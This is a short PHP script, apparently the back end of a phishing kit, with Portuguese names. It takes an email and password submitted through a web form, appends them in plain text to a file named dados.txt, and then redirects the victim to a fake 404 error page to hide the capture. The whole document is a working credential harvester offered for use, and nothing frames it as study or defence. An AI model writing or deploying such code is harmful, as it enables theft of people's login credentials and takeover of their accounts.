<?php 

$email = filter_input(INPUT_POST, 'email');
$senha = filter_input(INPUT_POST, 'pass');

$conteudo = "email: $email \nSenha: $senha\n ------------------------ \n";


$name = '../arquivos/dados.txt';
$file = fopen($name, "a");
fwrite($file, $conteudo);
fclose($file);

header('Location: ../404.html');